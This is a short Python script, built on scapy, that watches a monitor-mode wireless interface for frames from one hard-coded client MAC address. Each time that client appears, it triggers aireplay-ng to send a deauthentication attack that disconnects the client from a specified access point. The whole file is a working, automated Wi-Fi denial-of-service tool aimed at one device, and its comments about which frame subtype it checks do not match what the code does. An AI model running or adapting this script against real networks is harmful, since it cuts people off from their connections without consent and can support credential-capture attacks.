#!/usr/bin/env python3

from scapy.all import *
import socket
import time
from datetime import datetime
from zoneinfo import ZoneInfo
import subprocess

cmd = [ "aireplay-ng", "-0", "1", "-a", "b2:b0:f2:09:7e:5d", "-c", "28:6b:35:8e:6f:17", "wlo1mon"]

MONITOR_IFACE = "wlo1mon"      # your monitor-mode interface
TARGET_MAC = "28:6b:35:8e:6f:17"  # MAC you want to detect

def now_ist():
    return datetime.now(ZoneInfo("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S.%f")

def handle_packet(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 2:  # subtype 11 = Authentication  # subtype 11 = Authentication
            src = pkt.addr2

            if src and src.lower() == TARGET_MAC.lower():
                print(f"[+] detected from {src}")
                print(f"at {now_ist()}")
                subprocess.run(cmd)

def main():
    print(f"[*] Sniffing for Authentication requests from {TARGET_MAC}...")
    sniff(iface=MONITOR_IFACE, prn=handle_packet, store=0)

if __name__ == "__main__":
    main()